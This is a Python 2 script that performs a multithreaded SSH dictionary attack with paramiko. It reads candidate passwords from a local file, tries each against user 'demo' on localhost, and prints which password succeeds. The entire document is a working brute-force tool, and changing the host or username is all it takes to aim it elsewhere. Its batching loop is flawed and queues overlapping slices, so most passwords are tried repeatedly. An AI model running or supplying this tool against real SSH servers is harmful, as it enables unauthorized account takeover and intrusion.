#!/usr/bin/env python

import threading
import Queue
import time 
import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())


class WorkerThread(threading.Thread):

    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())			

    def bruter(self, password):
        try:
            self.ssh.connect('localhost', username='demo', password=password)

        except paramiko.AuthenticationException:
            print  "[-]  Password %s is incorrect\n"%password
        
        except:
            print  "[-]  Connection Failure\n"

        else:
            print "[+] Password %s is Correct!!!"%password
            

    def run(self):

        step = 0
        while True:
            password = self.queue.get()
            self.bruter(password)
            self.queue.task_done()



#queue to fetch work from 
queue = Queue.Queue()

print "[++] Starting Multithreading Dictionary Attack using paramiko [++]"
for i in range(10):
    worker = WorkerThread(queue)
    worker.setDaemon(True)
    worker.start()

with open('passwdList.txt', mode='r') as passwdListF:
    passwdList = passwdListF.readlines()
     
j = 0
offset= 20
for j in xrange(0,len(passwdList)):
    pwdlist =  passwdList[j:j+offset]
    for password in pwdlist:
        queue.put(password.strip())
    queue.join()

    j =  j + offset 
    
    
print "All passwords checked"



